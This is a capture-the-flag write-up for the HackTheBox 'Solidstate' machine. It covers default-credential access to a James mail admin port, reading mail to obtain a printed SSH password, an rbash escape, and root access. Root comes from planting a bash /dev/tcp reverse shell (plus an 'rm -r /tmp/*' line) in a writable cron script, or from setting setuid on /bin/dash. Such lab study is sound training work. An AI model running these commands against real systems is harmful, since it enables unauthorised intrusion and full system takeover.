@@ -1,0 +1,105 @@
+HTB-Solidstate-Writeup
+
+ip : 10.10.10.51
+
+Nmap
+----
+- nmap revealed 6 open ports
+	SSH on 22
+	SMTP on 25
+	HTTP on 80
+	POP3 on 110 
+	NNTP on 119
+	James admin on 4555
+
+Enumeration
+-----------
+- visiting the site we see solid state security
+- there are 3 pages in total index.html, services.html and about.html
+- we do see a form at the bottom of the page
+- the form just submits POST to / and return the main page so its of no use to us 
+- directory bruteforcing the site didnt give much useful information
+- we can start enumerating james mail server and all its components 
+- 25/110/119/4555
+- the port 4555 is james admin portal and nmap identified the version as 2.3.2
+- we can check for any known vulnerability in searchsploit 
+- we found an RCE for this in searchsploit (explained in intended path section)
+
+Shell as mindy
+--------------
+- we can connect to 4555 using netcat and we are prompted for a login
+
+	nc 10.10.10.51 4555
+
+- we try the default credentials and root/root works
+- we can check the list of commands using help
+- we can list users and change passwords
+
+	listusers
+	setpassword james newpassword123
+
+- we change all the 5 users passwords and check their mail by connecting to port 110 through telnet
+
+	telnet 10.10.10.51 110
+
+- on connecting as john it shows up one message, we can read it using RETR command 
+	
+	RETR 1
+
+- the message tells us that the user mindy has a temperory password 
+- we can connect as mindy and we see 2 messages , reading it 
+- we got SSH credentials for mindy to a restricted shell
+
+	creds : mindy : P@55W0rd1!2@
+
+- we can SSH into the machine as mindy
+- on checking /etc/passwd we can see that mindy has a rbash (restricted bash)
+- grab the user.txt
+
+Escaping rbash
+--------------
+- we can escape out of the rbash by providing the -t flag along with ssh command which will run bash on connect instead of assigned shell
+
+	ssh mindy@10.10.10.51 -t bash
+
+- or we can just run bash command and we will have bash 
+
+Intended path
+-------------
+- we try to get a shell using the RCE we found earlier 
+- run the exploit with options and start a netcat listener to get a shell
+
+Priv-esc
+--------
+- checking around for interesting files found us a world writable root owned script in the /opt directory
+- check looks like a cronjob script 
+- we can confirm this by running a 32 bit pspy.py script on the machine
+- we download pspy, start a python server and wget it on the victim machine 
+- running it confirms that the script is a cronjob running every 3 minutes
+- we can edit the script and insert a reverse shell into it 
+
+	#!/usr/bin/env python
+	import os
+	import sys
+	try:
+	     os.system('rm -r /tmp/* ')
+	except:
+	     sys.exit()
+	os.system('bash -c "bash -i >& /dev/tcp/10.10.14.47/9001 0>&1"')
+
+- start a netat listener 
+
+	nc -nlvp 9001
+
+- we got shell as root
+
+Method 2
+--------
+- we can also edit the script to add a setuid bit for dash which will be owned by root
+- running dash will give us a shell that has the euid of root 
+
+	os.system('chmod 4755 /bin/dash')
+
+- wait 3 minutes 
+- run dash and we have a root shell
+- grab the root flag  
